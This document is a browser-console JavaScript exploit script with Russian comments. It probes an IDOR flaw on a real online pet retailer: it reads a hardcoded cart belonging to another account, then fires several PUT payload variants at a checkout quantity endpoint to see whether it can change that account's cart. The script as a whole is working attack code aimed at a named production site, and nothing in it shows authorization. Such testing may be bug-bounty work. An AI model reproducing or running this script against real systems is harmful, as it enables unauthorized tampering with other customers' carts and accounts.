// Тест с правильным методом PUT (найден в Network tab!)
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

console.log("[*] Testing PUT method (found in Network tab!)");
console.log("[*] Endpoint: PUT /semiprotected/api/checkout/state-api/v2/set-article-quantity");

fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  window.beforeCount = cart.articles.length;
  window.beforeTotal = cart.summary.grandTotal;
  const articleId = cart.articles[0]?.id;
  console.log(`[+] Cart before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
  console.log(`[+] Article ID: ${articleId}`);
  
  // Попробуем разные варианты payload с PUT методом
  const tests = [
    { name: "articleId + quantity", payload: { articleId: articleId, quantity: 2 } },
    { name: "id + quantity", payload: { id: articleId, quantity: 2 } },
    { name: "articleId + qty", payload: { articleId: articleId, qty: 2 } },
    { name: "With cartUuid", payload: { articleId: articleId, quantity: 2, cartUuid: CART_UUID } },
    { name: "With sid", payload: { articleId: articleId, quantity: 2, sid: CART_UUID } },
  ];
  
  return Promise.allSettled(
    tests.map((test, i) => {
      console.log(`\n[*] Test ${i+1}: ${test.name}`);
      return fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
        method: "PUT",  // ВАЖНО: PUT, не POST!
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        body: JSON.stringify(test.payload)
      })
      .then(async r => {
        const status = r.status;
        const contentType = r.headers.get("content-type") || "";
        const text = await r.text();
        
        console.log(`    Status: ${status}, Content-Type: ${contentType}`);
        
        if (contentType.includes("application/json")) {
          try {
            const json = JSON.parse(text);
            console.log(`    [!!!] SUCCESS! JSON response:`, JSON.stringify(json).substring(0, 200));
            return { success: true, test: i+1, name: test.name, status, response: json };
          } catch (e) {
            return { success: false, test: i+1, name: test.name, status, response: text };
          }
        } else {
          console.log(`    Response: ${text.substring(0, 200)}`);
          return { success: false, test: i+1, name: test.name, status, response: text, isHtml: true };
        }
      })
      .catch(e => {
        console.log(`    Error: ${e.message}`);
        return { success: false, test: i+1, name: test.name, error: e.message };
      });
    })
  );
})
.then(results => {
  console.log("\n[*] All tests completed. Checking cart...");
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  });
})
.then(r => r.json())
.then(cart => {
  const afterCount = cart.articles.length;
  const afterTotal = cart.summary.grandTotal;
  console.log(`\n[+] Cart after: ${afterCount} items, ${afterTotal} EUR`);
  
  if (afterCount !== window.beforeCount || Math.abs(afterTotal - window.beforeTotal) > 0.01) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log(`[!!!] Before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
    console.log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`);
    console.log("[!!!] Account B successfully modified Account A's cart!");
    console.log("\n[!!!] Working endpoint:");
    console.log(`[!!!] PUT /semiprotected/api/checkout/state-api/v2/set-article-quantity`);
  } else {
    console.log("[!] Cart unchanged - need exact payload format");
  }
})
.catch(e => console.error("[!] Error:", e));

